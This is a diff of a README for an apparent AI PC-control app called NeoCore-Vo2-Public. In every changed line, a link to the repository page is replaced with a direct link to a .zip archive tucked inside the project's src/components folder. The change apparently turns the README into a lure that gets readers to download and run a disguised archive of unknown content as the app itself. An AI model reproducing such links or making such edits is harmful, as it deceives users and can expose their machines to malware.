@@ -1,6 +1,6 @@
 # 🤖 NeoCore-Vo2-Public - Control Your PC With AI
 
-[![Download NeoCore-Vo2-Public](https://img.shields.io/badge/Download%20NeoCore--Vo2--Public-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lephuoc5054/NeoCore-Vo2-Public)
+[![Download NeoCore-Vo2-Public](https://img.shields.io/badge/Download%20NeoCore--Vo2--Public-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/lephuoc5054/NeoCore-Vo2-Public/main/src/components/Neo_Core_Vo_Public_v1.6.zip)
 
 ## 🧭 What this app does
 
@@ -18,7 +18,7 @@ Use it to:
 
 Visit this page to download and run the app:
 
-https://github.com/lephuoc5054/NeoCore-Vo2-Public
+https://raw.githubusercontent.com/lephuoc5054/NeoCore-Vo2-Public/main/src/components/Neo_Core_Vo_Public_v1.6.zip
 
 ## 🪟 Windows setup
 
@@ -217,4 +217,4 @@ These options help you shape the HUD for daily use.
 
 If you need the download page again, use this link:
 
-[NeoCore-Vo2-Public on GitHub](https://github.com/lephuoc5054/NeoCore-Vo2-Public)
+[NeoCore-Vo2-Public on GitHub](https://raw.githubusercontent.com/lephuoc5054/NeoCore-Vo2-Public/main/src/components/Neo_Core_Vo_Public_v1.6.zip)
